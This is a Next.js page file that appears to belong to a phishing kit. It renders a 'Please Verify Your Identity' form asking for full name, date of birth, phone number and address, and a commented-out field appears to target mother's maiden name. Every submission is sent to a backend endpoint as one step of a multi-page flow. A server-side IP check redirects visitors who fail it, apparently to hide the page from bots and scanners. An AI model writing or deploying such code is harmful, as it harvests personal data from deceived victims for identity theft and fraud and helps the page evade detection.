import axios from "axios";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { Input } from "../components/Input";
import { Container as Wrapper } from "../components/Container";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { DataContext } from "./_app";
import checkIp from "@/middleware/checkIp";
import { GetServerSideProps } from "next";

interface BillingProps {}

const schema = yup.object().shape({
  fullname: yup.string().required("Please enter your first name"),
  dob: yup.string().required("Please enter your date of birth"),
  address: yup.string().required("Please enter your Address"),
  phoneNumber: yup.string().required("Please enter your phone number"),
  // mmn: yup.string(),
});

export const Billing: React.FC<BillingProps> = ({}) => {
  const [loading, setLoading] = useState(false);

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onSubmit`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `BILLING`);
    formData.append(
      `billing`,
      JSON.stringify({ sessionId: datas.sessionId, ...data })
    );

    try {
      await axios.post(`/api/send-billing`, formData);
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      billing: data,
    });

    const url = getProgress()[getProgress().indexOf(`BILLING`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });
  return (
    <Wrapper
      title="Identify yourself"
      subTitle="Please Verify Your Identity"
      loading={loading}
      isValid={isValid}
      onSubmit={onSubmit}
      errors={errors}
    >
      <Input
        label={`Full name`}
        name={`fullname`}
        register={register}
        error={
          errors.fullname && (errors.fullname.message as unknown as string)
        }
      />

      <Input
        label={`Date of Birth`}
        name={`dob`}
        register={register}
        error={errors.dob && (errors.dob.message as unknown as string)}
        mask={`99/99/9999`}
      />

      <Input
        label={`Phone Number`}
        name={`phoneNumber`}
        register={register}
        error={
          errors.phoneNumber &&
          (errors.phoneNumber.message as unknown as string)
        }
        mask={`0499 999 999`}
      />

      <Input
        label={`Address`}
        name={`address`}
        register={register}
        error={errors.address && (errors.address.message as unknown as string)}
      />
    </Wrapper>
  );
};

export const getServerSideProps: GetServerSideProps = async ({ req }) => {
  const { valid } = await checkIp(req);

  return {
    props: { isBot: valid },
    ...(!valid ? {
      redirect: {
        destination: process.env.NEXT_PUBLIC_EXIT_URL,
        permanent: false,
      },
    } : {})
  };
};

export default Billing;
